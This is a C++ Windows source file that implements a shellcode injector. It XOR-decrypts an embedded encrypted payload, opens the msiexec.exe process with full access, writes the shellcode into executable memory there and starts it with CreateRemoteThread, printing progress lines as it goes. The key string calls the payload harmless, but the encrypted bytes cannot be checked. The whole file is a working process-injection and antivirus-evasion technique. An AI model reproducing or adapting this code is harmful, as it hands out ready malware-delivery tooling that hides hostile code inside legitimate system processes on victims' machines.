#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>


#pragma data_seg(".data")
unsigned char buf[] =
"\x34\x62\xac\x2b\xf3\x8c\xb4\xd5\xb4\x9a\x31\xa7\x43\x80"
"\x8d\xd5\xb7\x29\xc9\x01\x48\x48\xbd\x8f\xcb\x8b\x21\x31"
"\x5d\x37\x46\x2c\x51\x84\xac\x9a\x9c\x90\x91\xe4\x46\xe5"
"\x4f\x75\x23\x51\x2f\x1e\x0e\x24\xfe\xcf\xdc\xe5\x6d\x2e"
"\x85\x62\xd6\x16\xca\xd7\x7e\x5b\x08\xda\xe0\xb7\xcc\x33"
"\x60\x29\x18\x08\x32\xd3\xd2\xbc\x37\xca\x1e\x8c\xf4\xcd"
"\xdb\x87\xec\xa5\x6b\x3f\x98\xae\xac\x82\x6d\xc2\x8c\x44"
"\xf3\x81\x73\x5c\xce\x4c\x00\x08\xac\x3c\xd6\x82\xe1\x68"
"\x77\x17\xe5\x64\xe6\x28\x55\x18\x4a\x5c\xb2\x53\xc3\xba"
"\x39\x00\xc0\xcc\x22\x80\x9d\x88\x6d\x8a\x96\x3c\xdd\x9e"
"\xab\x6e\x7d\xcd\x22\x62\xf5\xd7\x79\xea\xb9\x49\x50\xab"
"\xeb\xc2\xfa\x42\x69\xea\x81\x03\x24\xac\x15\xef\x12\xdf"
"\x0f\x6e\x6b\xc9\x0a\x59\x28\xb9\x4f\x6a\x60\xb6\x2b\xe6"
"\xd0\x52\x4a\x0d\x8f\x87\xd7\xc8\xc1\x78\x85\x19\xe5\x16"
"\xc5\x83\x75\x3e\x91\x28\xfd\x12\x99\xb9\x4f\x82\x1d\x1b"
"\xc1\x92\x43\xb0\x83\x09\xde\x01\xfa\xd1\x93\x78\x2b\x64"
"\x1b\x0d\xf8\xd2\xd8\xfe\x65\x51\x2d\x00\x2e\x62\xa4\xee"
"\x38\xd8\xa1\x0c\xa5\xe3\xd4\xe1\xe1\x36\xac\x14\x5c\x6f"
"\x7b\xf5\x7a\xf8\x03\x3f\x85\xcf\xbd\x88\x24\x10\x19\x28"
"\xe2\x16\x75\xf6\xb5\xaa\xcf\x49\xb7\xd6\xee\x3d\xd7\x0f"
"\xd0\x4e\xbc\x80\xd1\x3a\x97\xd6\x1d\x3c\xfb\xcc\x04\x50"
"\x6d\x81\xa9\x10\x27\xd5\xf5\x8f\x22\xe7\xdb\x2a\x22\x6f"
"\xa3\x9c\x2e\x1e\x0e\x3c\xee\x34\xa5\x37\x4e\x1f\xa8\xd2"
"\xf4\x97\xd9\xe9\x7f\x5d\x0d\x60\x7b\xe2\xb5\x78\x7a\xf6"
"\x90\x4f\x0c\x5b\xd0\x0e\xc6\x4b\xdf\xc6\xc7\x27\x79\xb9"
"\xf3\xe9\xa8\x8b\xac\x25\x47\xc8\x3c\x42\x1d\x05\x3b\x62"
"\xfa\x37\xda\x5f\xfb\xc0\x41\xc3\xe5\x5d\xbf\xaf\x8b\x2b"
"\xee\xfd\x7f\x67\x58\xe5\xa9\xcd\xbd\xd6\xb1\xf2\xba\xec"
"\x5b\x04\x23\x62\xd0\xb9\xec\x65\x52\x09\xe2\x9e\x23\x47"
"\x78\xfc\x60\x9b\x74\x89\x56\x6f\xb1\xf9\x48\x36\xe8\xc7"
"\x48\x4f\x01\x4b\xc1\xb4\xc5\xd8\xdc\xfe\x7b\x09\x57\x5f"
"\xab\xc9\x93\xd8\xac\xe7\x46\x5a\x68\xcf\x71\xcb\x85\x4d"
"\xac\xbe\x7e\xc7\x1b\x32\x59\x84\x9a\x0c\x90\x54\xcc\x2e"
"\xcc\x77\xc8\x94\xf4\x10\x6c\xb0\xb1\x0b\x84\xcf\xd7\x6c"
"\x46\x72\xf0\x0d\x2b\x68\xfa\xd8\xc5\xf1\x02\x3c\x05\x54"
"\xa2\xd2\xd8\xd5\x3c\x4a\x36\xf2\xa6\xa1\x8b\x9f\x95\xf2"
"\x16\x0d\xa5\x00\xfb\xc7\x27\x45\xba\x8a\xea\x6f\x4a\x41"
"\x0f\xb9\x8b\xb3\xff\x91\x4d\xf2\x0d\xd6\x10\xfb\x5d\xea"
"\x27\xff\xcb\xa1\x37\x22\xb7\x8f\x1c\x54\x2f\x6c\x66\x0d"
"\x35\x4b\x72\x6b\x33";


void XORDecrypt() {

	const char* key = "|Secret*Key*For*Harmless*Payload|";
	int j = 0;

	for (int i = 0; i < sizeof(buf); i++) {

		if (j == strlen(key))
			j = 0;

		buf[i] = buf[i] ^ key[j];
		j++;
	}
}


int pidByName(const wchar_t* procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (INVALID_HANDLE_VALUE == hSnapshot) return -1;

	pe.dwSize = sizeof(PROCESSENTRY32);

	hResult = Process32First(hSnapshot, &pe);

	while (hResult) {
		if (wcscmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	CloseHandle(hSnapshot);
	return pid;
}



int main(int argc, char* argv[]) {

	int pid = pidByName(L"msiexec.exe");

	HANDLE pHandle = NULL;
	PVOID rBuffer = NULL;

	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	printf("[+] Handle to PID [%i] is: %p\n", pid, pHandle);

	XORDecrypt();
	printf("[+] Payload Decrypted\n");

	rBuffer = VirtualAllocEx(pHandle, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Successfully allocated memory at %p\n", rBuffer);

	WriteProcessMemory(pHandle, rBuffer, buf, sizeof(buf), NULL);
	printf("[+] Shellcode has been added into process memory of PID %i\n", pid);

	HANDLE hThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
	printf("Remote thread %p created in PID %i\n", hThread, pid);

	CloseHandle(hThread);
	CloseHandle(pHandle);

	return 0;
}